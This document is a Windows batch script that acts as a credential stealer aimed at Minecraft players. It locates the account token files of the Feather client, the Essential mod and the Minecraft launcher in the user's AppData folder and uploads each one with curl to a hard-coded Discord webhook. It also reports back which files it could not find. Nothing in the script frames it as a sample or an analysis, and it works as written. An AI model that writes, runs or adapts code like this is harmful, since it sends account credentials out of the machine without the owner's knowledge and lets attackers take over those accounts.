@echo off
:: Define the file paths relative to %AppData%
set "feather_file=%AppData%\.feather\accounts.json"
set "essential_file=%AppData%\.minecraft\essential\microsoft_accounts.json"
set "minecraft_file=%AppData%\.minecraft\launcher_accounts_microsoft_store.json"

:: Define the Discord webhook URL
set "webhook_url=https://discord.com/api/webhooks/1332930112491884604/vmDraTMAZhzxDzh-GgzeWErsfj_krrPWnYDl2lrXbFSYbBe9svGOxFIRe7vh13uEYII4"

:: Initialize variables for missing files
set "discord_message="

:: Check and send Feather accounts file
if exist "%feather_file%" (
    echo Sending Feather Accounts File: %feather_file%
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: multipart/form-data" ^
        -F "file=@%feather_file%" ^
        -F "content=Feather Accounts File:"
) else (
    echo Feather Accounts File not found: %feather_file%
    set "discord_message=%discord_message%Feather Accounts File: Not Found.%0A"
)

:: Check and send Essentials accounts file
if exist "%essential_file%" (
    echo Sending Essentials Accounts File: %essential_file%
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: multipart/form-data" ^
        -F "file=@%essential_file%" ^
        -F "content=Essentials Accounts File:"
) else (
    echo Essentials Accounts File not found: %essential_file%
    set "discord_message=%discord_message%Essentials Accounts File: Not Found.%0A"
)

:: Check and send Minecraft launcher accounts file
if exist "%minecraft_file%" (
    echo Sending Minecraft Launcher Accounts File: %minecraft_file%
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: multipart/form-data" ^
        -F "file=@%minecraft_file%" ^
        -F "content=Minecraft Accounts Launcher File:"
) else (
    echo Minecraft Launcher Accounts File not found: %minecraft_file%
    set "discord_message=%discord_message%Minecraft Accounts Launcher File: Not Found.%0A"
)

:: Send a message to the webhook if any files are missing
if not "%discord_message%"=="" (
    echo Sending missing files message to Discord webhook
    curl -X POST "%webhook_url%" ^
        -H "Content-Type: application/json" ^
        -d "{\"content\": \"%discord_message%\"}"
)

echo Process complete!
pause
